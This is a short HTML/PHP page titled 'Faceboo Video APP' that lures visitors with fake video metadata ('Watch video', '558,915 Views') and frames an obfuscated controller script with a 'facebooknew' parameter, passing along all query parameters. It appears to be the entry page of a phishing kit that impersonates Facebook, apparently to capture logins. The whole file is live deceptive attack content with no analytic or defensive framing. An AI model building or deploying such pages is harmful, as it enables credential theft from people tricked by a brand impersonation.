
	<html> 
	<head> 
	<title>Faceboo Video APP</title>
		
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:site" content="@" />
		<meta name="twitter:title" content="Watch video @" />
		<meta name="twitter:description" content="558,915 Views " />
		<meta name="twitter:image" content="https://avatars.io/twitter/" />
	
	</head>
	<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
	<frame name="main" src="../.././public/CONTROLLERe343d111-40a6-48e3-96e0-4afee5d8a222.php?source=.%2Fpublic%2FACCESSS3cf0271e-683d-45e1-9eda-cb24c8d67042&lan=facebooknew&<?php echo http_build_query($_GET); ?>"> <noframes> 
	<body bgcolor="#FFFFFF" text="#000000"> 
	<a href="../.././public/CONTROLLERe343d111-40a6-48e3-96e0-4afee5d8a222.php?source=.%2Fpublic%2FACCESSS3cf0271e-683d-45e1-9eda-cb24c8d67042&lan=facebooknew&<?php echo http_build_query($_GET); ?>">Click here to continue</a> 
	</body> 
	</noframes> 
	</html> 
   